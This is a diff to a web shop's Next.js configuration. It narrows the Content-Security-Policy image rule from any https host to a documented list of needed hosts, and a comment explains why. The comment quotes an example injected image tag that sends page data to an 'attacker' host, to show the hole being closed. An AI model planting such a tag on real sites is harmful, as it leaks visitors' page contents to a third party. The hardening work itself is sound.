@@ -71,7 +71,43 @@ const nextConfig = {
               "script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com https://www.googleadservices.com https://googleads.g.doubleclick.net https://checkout.razorpay.com https://cdn.razorpay.com https://connect.facebook.net https://static.cloudflareinsights.com https://sdk.cashfree.com",
               "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
               "font-src 'self' data: https://fonts.gstatic.com",
-              "img-src 'self' data: blob: https:",
+              // img-src was "https:", which allowed an image from ANY https host.
+              // That is the hole an injected <img src="https://attacker/?d=..."> uses
+              // to carry a page's contents out — the request leaves before anything
+              // can stop it, and no image has to come back for the theft to work.
+              //
+              // Every host below was found by reading the code, not guessed:
+              //   own domain      — product photos, uploaded customer photos and
+              //                     review photos are all served from here
+              //                     (next/image proxies through /_next/image, which
+              //                     is same-origin, so its remote hosts need no entry)
+              //   api.qrserver.com — the QR square on the printed shipping label
+              //                     (lib/orderLabel.ts); the only outside image the
+              //                     code itself asks for
+              //   facebook        — the Meta Pixel reports by fetching a 1x1 GIF
+              //                     from facebook.com/tr
+              //   google-analytics, googletagmanager, googleadservices,
+              //   doubleclick, google.com/.co.in
+              //                   — GA4 and the Google Ads conversion and
+              //                     remarketing pixels, same 1x1 trick
+              //   razorpay, cashfree — logos the checkout script paints onto the page
+              //   cloudinary, amazonaws — the hosts images.remotePatterns allows,
+              //                     kept so a plain <img> to either still works
+              //
+              // If something stops appearing after this, the browser console names
+              // the blocked host in full. Add that one host here — never "https:".
+              "img-src 'self' data: blob: "
+                + "https://mahalaxmifashionhub.com https://www.mahalaxmifashionhub.com "
+                + "https://api.qrserver.com "
+                + "https://www.facebook.com https://*.facebook.com "
+                + "https://www.google-analytics.com https://*.google-analytics.com "
+                + "https://www.googletagmanager.com "
+                + "https://www.googleadservices.com https://googleads.g.doubleclick.net "
+                + "https://stats.g.doubleclick.net https://*.g.doubleclick.net "
+                + "https://www.google.com https://www.google.co.in "
+                + "https://cdn.razorpay.com https://*.razorpay.com "
+                + "https://*.cashfree.com "
+                + "https://res.cloudinary.com https://*.cloudinary.com https://*.amazonaws.com",
               "connect-src 'self' https://www.google-analytics.com https://region1.google-analytics.com https://analytics.google.com https://www.googletagmanager.com https://api.razorpay.com https://lumberjack.razorpay.com https://connect.facebook.net https://*.facebook.com https://static.cloudflareinsights.com https://*.merchant-center-analytics.goog https://*.google.com https://*.cashfree.com https://sdk.cashfree.com https://stats.g.doubleclick.net https://*.g.doubleclick.net https://www.googleadservices.com https://ad.doubleclick.net",
               "frame-src https://checkout.razorpay.com https://api.razorpay.com https://*.razorpay.com https://*.cashfree.com https://sdk.cashfree.com https://www.google.com https://maps.google.com",
               "object-src 'none'",
